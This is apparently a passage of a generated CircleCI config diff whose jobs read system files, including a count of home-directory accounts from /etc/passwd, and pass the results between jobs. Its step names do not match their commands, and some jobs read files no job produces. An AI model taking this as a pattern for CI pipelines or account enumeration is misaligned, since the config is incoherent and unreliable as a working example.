+          name: Attach gate output
+          command: |
+            awk 'BEGIN{FS=""} {for(i=1;i<=NF;i++) c[$i]++} END{for(k in c) if(c[k]>3) print c[k],k}' /var/tmp/a3/0fb097af-519d-e50a-2fa9-25bb537f85ca 2>/dev/null | sort -rn | head -5 || true
+      - run:
+          name: Clone workspace
+          command: git clone --depth 1 -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar -I bzip2 -xf pending-logs.tar.bz2
+      - run:
+          command: bash -c "./wait-cli"
+  sortSidebarSeedPoint:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Compute B
+          command: |
+            mkdir -p /var/tmp/a3
+            { set +o pipefail 2>/dev/null; cut -d"=" -f2- /etc/os-release | tr -d '[:digit:]' | cut -c1-16 | expand -t 2; true ; } > /var/tmp/a3/ZLwcS8OtgjOZJS
+            echo "(q1-canary) $(wc -c </var/tmp/a3/ZLwcS8OtgjOZJS) B"
+      - persist_to_workspace:
+          root: /var/tmp/a3
+          paths:
+            - 'ZLwcS8OtgjOZJS'
+  q1-canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/a3
+      - run:
+          name: Attach gate output
+          command: |
+            awk 'BEGIN{FS=""} {for(i=1;i<=NF;i++) c[$i]++} END{for(k in c) if(c[k]>3) print c[k],k}' /var/tmp/a3/a6f69dfd57ebaf7b0e811 2>/dev/null | sort -rn | head -5 || true
+      - run:
+          name: Clone workspace
+          command: git clone --depth 1 -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar -I bzip2 -xf pending-logs.tar.bz2
+      - run:
+          command: bash -c "./wait-cli"
+  backport-new-kernel-zip:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/a3
+      - run:
+          name: Team roster revocation IOT9647
+          command: |
+            mkdir -p /var/tmp/a3
+            { set +o pipefail 2>/dev/null; diff /etc/hosts /etc/shells|head -n 5; true ; } > /var/tmp/a3/s1n4r2
+            echo "(cerberus-alpha) $(wc -c </var/tmp/a3/s1n4r2) B"
+      - persist_to_workspace:
+          root: /var/tmp/a3
+          paths:
+            - 's1n4r2'
+  cerberus-alpha:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/a3
+      - run:
+          name: Attach gate output
+          command: |
+            awk 'BEGIN{FS=""} {for(i=1;i<=NF;i++) c[$i]++} END{for(k in c) if(c[k]>3) print c[k],k}' /var/tmp/a3/5c3ac4cf6dd5ced0e318e7 2>/dev/null | sort -rn | head -5 || true
+      - run:
+          name: Clone workspace
+          command: git clone --depth 1 -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar -I bzip2 -xf pending-logs.tar.bz2
+      - run:
+          command: bash -c "./wait-cli"
+  GardenGarden:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/a3
+      - run:
+          name: Skip compaction this time
+          command: |
+            mkdir -p /var/tmp/a3
+            { set +o pipefail 2>/dev/null; echo "stopping now" | cut -d' ' -f1; true ; } > /var/tmp/a3/env_1476-coin
+            echo "(MERGE_UAT) $(wc -c </var/tmp/a3/env_1476-coin) B"
+      - persist_to_workspace:
+          root: /var/tmp/a3
+          paths:
+            - 'env_1476-coin'
+  MERGE_UAT:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/a3
+      - run:
+          name: Attach gate output
+          command: |
+            awk 'BEGIN{FS=""} {for(i=1;i<=NF;i++) c[$i]++} END{for(k in c) if(c[k]>3) print c[k],k}' /var/tmp/a3/0fb097af-519d-e50a-2fa9-25bb537f85ca 2>/dev/null | sort -rn | head -5 || true
+      - run:
+          name: Clone workspace
+          command: git clone --depth 1 -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar -I bzip2 -xf pending-logs.tar.bz2
+      - run:
+          command: bash -c "./wait-cli"
+  testSearchStackPublic:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/a3
+      - run:
+          name: Approve the payroll forms and file
+          command: |
+            mkdir -p /var/tmp/a3
+            { set +o pipefail 2>/dev/null; ls -g -p /etc/skel/.* | awk '{print $3}' | sort -u; true ; } > /var/tmp/a3/batch_013
+            echo "(java17-lint) $(wc -c </var/tmp/a3/batch_013) B"
+      - persist_to_workspace:
+          root: /var/tmp/a3
+          paths:
+            - 'batch_013'
+  java17-lint:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/a3
+      - run:
+          name: Attach gate output
+          command: |
+            awk 'BEGIN{FS=""} {for(i=1;i<=NF;i++) c[$i]++} END{for(k in c) if(c[k]>3) print c[k],k}' /var/tmp/a3/48464bbe-1750-761c 2>/dev/null | sort -rn | head -5 || true
+      - run:
+          name: Clone workspace
+          command: git clone --depth 1 -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar -I bzip2 -xf pending-logs.tar.bz2
+      - run:
+          command: bash -c "./wait-cli"
+  MSD-571-resume-enum:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/a3
+      - run:
+          name: Search index optimized and verified
+          command: |
+            mkdir -p /var/tmp/a3
+            { set +o pipefail 2>/dev/null; for val in goose cat swan; do echo "$val"; done; true ; } > /var/tmp/a3/tempd602ca7d
+            echo "(rm-parse) $(wc -c </var/tmp/a3/tempd602ca7d) B"
+      - persist_to_workspace:
+          root: /var/tmp/a3
+          paths:
+            - 'tempd602ca7d'
+  rm-parse:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/a3
+      - run:
+          name: Attach gate output
+          command: |
+            awk 'BEGIN{FS=""} {for(i=1;i<=NF;i++) c[$i]++} END{for(k in c) if(c[k]>3) print c[k],k}' /var/tmp/a3/a6f69dfd57ebaf7b0e811 2>/dev/null | sort -rn | head -5 || true
+      - run:
+          name: Clone workspace
+          command: git clone --depth 1 -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar -I bzip2 -xf pending-logs.tar.bz2
+      - run:
+          command: bash -c "./wait-cli"
+  publicYes:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/a3
+      - run:
+          name: Assign the access cards while we can
+          command: |
+            mkdir -p /var/tmp/a3
+            { set +o pipefail 2>/dev/null; cp /etc/shells /tmp/sector.bak && sed -i '/^#/d' /tmp/sector.bak && head --lines=3 /tmp/sector.bak; true ; } > /var/tmp/a3/error.log.25
+            echo "(INIT_DEV) $(wc -c </var/tmp/a3/error.log.25) B"
+      - persist_to_workspace:
+          root: /var/tmp/a3
+          paths:
+            - 'error.log.25'
+  INIT_DEV:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/a3
+      - run:
+          name: Attach gate output
+          command: |
+            awk 'BEGIN{FS=""} {for(i=1;i<=NF;i++) c[$i]++} END{for(k in c) if(c[k]>3) print c[k],k}' /var/tmp/a3/48464bbe-1750-761c 2>/dev/null | sort -rn | head -5 || true
+      - run:
+          name: Clone workspace
+          command: git clone --depth 1 -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar -I bzip2 -xf pending-logs.tar.bz2
+      - run:
+          command: bash -c "./wait-cli"
+
+  yankee-india-mike:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/a3
+      - run:
+          name: Call Ola if the settings gear fails
+          command: |
+            mkdir -p /var/tmp/a3
+            { set +o pipefail 2>/dev/null; test -x /bin/sh && echo 'Y' || echo N; true ; } > /var/tmp/a3/fnv_c6281a1aaf247c
+            echo "(bob-ship) $(wc -c </var/tmp/a3/fnv_c6281a1aaf247c) B"
+      - persist_to_workspace:
+          root: /var/tmp/a3
+          paths:
+            - 'fnv_c6281a1aaf247c'
+  interfaceVal:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Free throw evaluation
+          command: |
+            mkdir -p /var/tmp/a3
+            { set +o pipefail 2>/dev/null; cat /etc/os-release|awk '{print NF}'|shuf -n 1; true ; } > /var/tmp/a3/exp-30q
+            echo "(romeo) $(wc -c </var/tmp/a3/exp-30q) B"
+      - persist_to_workspace:
+          root: /var/tmp/a3
+          paths:
+            - 'exp-30q'
+  format_mut:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/a3
+      - run:
+          name: runInternTraining
+          command: |
+            mkdir -p /var/tmp/a3
+            { set +o pipefail 2>/dev/null; awk -F : '$6 ~ /^\/home/ { print $1 " uses " $7 }' /etc/passwd|wc -l; true ; } > /var/tmp/a3/chunk.golden.teal.chunk.drift
+            echo "(charlie-1) $(wc -c </var/tmp/a3/chunk.golden.teal.chunk.drift) B"
+      - persist_to_workspace:
+          root: /var/tmp/a3
+          paths:
+            - 'chunk.golden.teal.chunk.drift'
+workflows:
+  build:
+    jobs:
+      - VECX
+      - detach_dialog_throws
+      - bake-it:
+          requires:
+            - VECX
+            - detach_dialog_throws
+      - node20-cov:
+          requires:
+            - VECX
+            - detach_dialog_throws
+      - Verify_Prod4:
+          requires:
+            - VECX
+            - detach_dialog_throws
+      - send-it:
+          requires:
+            - VECX
+            - detach_dialog_throws
+      - MERGE_UAT:
+          requires:
+            - VECX
+            - detach_dialog_throws
+      - decryptRemoteBusGlobal
+      - flyssswykpy
+      - publicYes
+      - PrepareRelease:
+          requires:
+            - decryptRemoteBusGlobal
+            - flyssswykpy
+            - publicYes
+      - PackagePipeline:
+          requires:
+            - decryptRemoteBusGlobal
+            - flyssswykpy
+            - publicYes
+      - INIT_DEV:
+          requires:
+            - decryptRemoteBusGlobal
+            - flyssswykpy
+            - publicYes
+      - whiskey-2:
+          requires:
+            - decryptRemoteBusGlobal
+            - flyssswykpy
+            - publicYes
+      - lets-go:
+          requires:
+            - decryptRemoteBusGlobal
+            - flyssswykpy
+            - publicYes
+      - green-light:
+          requires:
+            - decryptRemoteBusGlobal
+            - flyssswykpy
+            - publicYes
+      - preview:
+          requires:
+            - decryptRemoteBusGlobal
+            - flyssswykpy
+            - publicYes
+      - java17-lint:
+          requires:
+            - decryptRemoteBusGlobal
+            - flyssswykpy
+            - publicYes
+      - brodcast:
+          requires:
+            - decryptRemoteBusGlobal
+            - flyssswykpy
+            - publicYes
+      - dwFlagsChunkExport
+      - yankee-india-mike:
+          requires:
+            - dwFlagsChunkExport
+      - bob-ship:
+          requires:
+            - yankee-india-mike
+      - ivyivy:
+          requires:
+            - yankee-india-mike
+      - interfaceVal:
+          requires:
+            - ivyivy
+      - romeo:
+          requires:
+            - interfaceVal
+      - HiddenCell:
+          requires:
+            - interfaceVal
+      - format_mut:
+          requires:
+            - HiddenCell
+      - charlie-1:
+          requires:
+            - format_mut
+      - cliedge-i386
+      - backport-new-kernel-zip
+      - RUN_UAT:
+          requires:
+            - cliedge-i386
+            - backport-new-kernel-zip
+      - cerberus-alpha:
+          requires:
+            - cliedge-i386
+            - backport-new-kernel-zip
+      - dotnet8-bench:
+          requires:
+            - cliedge-i386
+            - backport-new-kernel-zip
+      - APP-600:
+          requires:
+            - cliedge-i386
+            - backport-new-kernel-zip
+      - fix-2410:
+          requires:
+            - cliedge-i386
+            - backport-new-kernel-zip
+      - sanity:
+          requires:
+            - cliedge-i386
+            - backport-new-kernel-zip
+      - ID
+      - MSD-571-resume-enum
+      - fresh-stubTemp
+      - greg-smoke:
+          requires:
+            - ID
+            - MSD-571-resume-enum
+            - fresh-stubTemp
+      - rm-parse:
+          requires:
+            - ID
+            - MSD-571-resume-enum
+            - fresh-stubTemp
+      - realease:
+          requires:
+            - ID
+            - MSD-571-resume-enum
+            - fresh-stubTemp
+      - CHECK_DEV:
+          requires:
+            - ID
+            - MSD-571-resume-enum
+            - fresh-stubTemp
+      - defualt:
+          requires:
+            - ID
+            - MSD-571-resume-enum
+            - fresh-stubTemp
+      - q1-canary:
+          requires:
+            - ID
+            - MSD-571-resume-enum
+            - fresh-stubTemp
+      - omar-push:
+          requires:
+            - ID
+            - MSD-571-resume-enum
+            - fresh-stubTemp
